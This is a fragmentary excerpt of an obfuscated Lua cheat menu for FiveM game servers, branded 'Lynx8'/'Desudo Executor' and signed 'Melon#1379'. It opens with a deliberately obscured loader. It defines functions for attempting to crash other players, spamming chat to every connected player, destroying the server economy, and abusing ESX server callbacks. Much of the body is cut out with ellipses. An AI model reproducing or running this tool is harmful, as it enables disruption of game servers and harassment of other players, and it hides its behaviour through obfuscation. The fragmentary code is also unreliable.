...
local function IllIlllIllIlllIlllIlllIll(IllIlllIllIllIll) if (IllIlllIllIllIll==(((((919 + 636)-636)*3147)/3147)+919)) then return not true end if (IllIlllIllIllIll==(((((968 + 670)-670)*3315)/3315)+968)) then return not false end end; local IllIllIllIllI = (7*3-9/9+3*2/0+3*3);local IIlllIIlllIIlllIIlllII = (3*4-7/7+6*4/3+9*9);local IllIIIllIIIIllI = table.concat;local function IllIIIIllIIIIIl(IllIllIllIllI) local function IIllllIIllll(IIlllIIlllIIlllIIlllII) local function IIllllIIllll(IIllllIIllll) end end end;IllIIIIllIIIIIl(900283);local function IllIlllIllIlllIlllIlllIllIlllIIIlll(IIlllIIlllIIlllIIlllII) local function IIllllIIllll(IIllllIIllll) local IIllllIIllll = (9*0-7/5+3*1/3+8*2) end end;IllIlllIllIlllIlllIlllIllIlllIIIlll(9083);local IllIIllIIllIII = load;
...
local function KeyboardInput(ak, al, am)
...
local function DrawText3D(x, y, z, E, r, g, b)
...
local function drawNotification(E)
...
local function checkValidVehicleMods(aw)
    local ar = PlayerPedId()
    local as = GetVehiclePedIsIn(ar, false)
    local at = {}
...
local function RequestModelSync(bq)
...
local function EconomyDestroyer2()
    if ESX then
...
local function UnemployedPlayers()
    if ESX then
        ESX.TriggerServerCallback(
...
local function AmbulancePlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
...
local function RealEstateAgentPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
...
local function CarDealerPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
...
local function UnemployedPlayer(bt)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
...
local function CarDealerPlayer(bt)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
...
local function RealEstateAgentPlayer(bt)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
...
local function AmbulancePlayer(bt)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
...
local function PolicePlayer(bt)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
...
local function MecanoPlayer(bt)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
...
local function matanumaispalarufe()
    TriggerServerEvent(
...
local function daojosdinpatpemata()
    local ar = GetPlayerPed(-1)
    local as = GetVehiclePedIsIn(ar, true)
    if
        IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
...
local function stringsplit(b_, c0)
    if c0 == nil then
        c0 = '%s'
    end
    local c1 = {}
...
local function SpectatePlayer(c4)
...
local function Clean(veh)
    SetVehicleDirtLevel(veh, 15.0)
end

local function Clean2(veh)
...
local function DrawSpecialText(ce, cf)
...
local function EnumerateEntities(cl, cm, cn)
...
local function RotationToDirection(cq)
...
local function OscillateEntity(entity, cu, cv, cw, cx)
    ...
    function()
        while bm do
            ...
            if chatspam then
                ...
                TriggerServerEvent('_chat:messageEntered', 'Melon#1379-Mllll', {0, 0x99, 255}, 'Add me Melon#1379')
            end
            ...
            if BananaBoom then
                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) then
                        ...
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            'Melon#1379-BANANAPARTY',
                            {0, 0x99, 255},
                            '/ooc Yo add me Melon#1379'
                        )
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            'Melon#1379-BANANAPARTY',
...
Citizen.CreateThread(
    function()
        ...
        Lynx8.CreateMenu('\76\121\110\120\88', 'Melon')
        Lynx8.SetSubTitle('\76\121\110\120\88', 'Desudo Executor')
        ...
        while bm do
            ...
            if Lynx8.IsMenuOpened('\76\121\110\120\88') then
                ...
                drawNotification("<FONT COLOR='#22ff40'>Modified By Melon#1379")
                if
                    Lynx8.MenuButton(
                ...
                elseif Lynx8.Button('~h~~r~Attempt Crash') then
                    ...
                    for i = 0, 64 do
                        ...
                        TriggerServerEvent(
                            ...
                            'Melon#1379-CrashAtt',
                            {0, 0x99, 255},
                            '/ooc /ooc Yo add me Melon#1379 >:D Player Crash Attempt'
                        )
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            'Melon#1379-CrashAtt',
                            {0, 0x99, 255},
                            '/ooc Yo add me Melon#1379 >:D Player Crash Attempt'
                        )
...
Lynx8.Display()
            ...
            elseif Lynx8.IsMenuOpened('BoostMenu') then
                ...
                Lynx8.Display()
            elseif IsDisabledControlPressed(0, 123) then
                if logged then
